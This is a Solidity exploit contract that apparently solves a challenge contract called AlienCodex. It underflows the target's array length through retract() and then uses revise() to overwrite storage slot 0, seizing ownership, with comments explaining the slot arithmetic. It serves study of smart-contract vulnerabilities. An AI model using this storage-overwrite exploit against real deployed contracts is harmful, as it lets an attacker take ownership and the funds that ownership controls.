// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IAlienCodex {
    function owner() external view returns (address);
    function makeContact() external;
    function record(bytes32 _content) external;
    function retract() external;
    function revise(uint256 i, bytes32 _content) external;
}

/**
 * @title AlienCodexExploit
 * @dev Exploits the AlienCodex contract to take ownership
 * The vulnerability lies in the retract() function which can underflow the array length
 * and in the revise() function that allows writing to any storage slot
 */
contract AlienCodexExploit {
    address public alienCodex;
    address public owner;

    constructor(address _alienCodex) {
        alienCodex = _alienCodex;
        owner = msg.sender;
    }
    
    /**
     * @dev Exploit the AlienCodex contract to take ownership
     * @param _newOwner Address to set as the new owner
     */
    function exploit(address _newOwner) external {
        require(msg.sender == owner, "Not the owner");
        IAlienCodex codex = IAlienCodex(alienCodex);
        
        // Step 1: Call makeContact to pass the contacted modifier
        codex.makeContact();
        
        // Step 2: Call retract() to underflow the array length
        // This makes the array length 2^256-1, so we can access any storage slot
        codex.retract();
        
        // Step 3: Calculate the index to overwrite the owner slot
        // The owner variable is inherited from the Ownable contract and is at slot 0
        // The codex array is at slot 1 (contact is a bool at slot 0 with the owner)
        // We need to find i where keccak256(1) + i = 0 (mod 2^256)
        // This means i = 0 - keccak256(1) (mod 2^256)
        uint256 arraySlot = 1;
        uint256 arrayIndex = uint256(2**256 - 1) - uint256(keccak256(abi.encode(arraySlot))) + 1;
        
        // Step 4: Use revise to overwrite the owner address at the calculated index
        // We need to convert the address to bytes32, padding with zeros on the left
        codex.revise(arrayIndex, bytes32(uint256(uint160(_newOwner))));
    }

    // Function to check if the exploit worked by reading the owner
    function checkOwner() external view returns (address) {
        return IAlienCodex(alienCodex).owner();
    }
}
